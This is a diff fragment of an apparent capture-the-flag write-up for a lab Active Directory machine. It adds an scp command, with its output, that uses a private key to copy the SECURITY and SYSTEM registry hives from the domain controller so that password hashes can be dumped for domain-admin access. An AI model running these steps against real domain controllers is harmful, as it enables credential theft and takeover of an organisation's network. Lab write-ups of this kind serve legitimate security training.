@@ -594,6 +594,15 @@ ntds.jfm
 This download the ntds.dit file
 
 ```python
-
+scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* . 
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+SECURITY                                                                             100%   32KB 608.9KB/s   00:00    
+SYSTEM
 ```
+Now i have both hives and i can dump the hashes
+
+## Access as domain admin
+
 
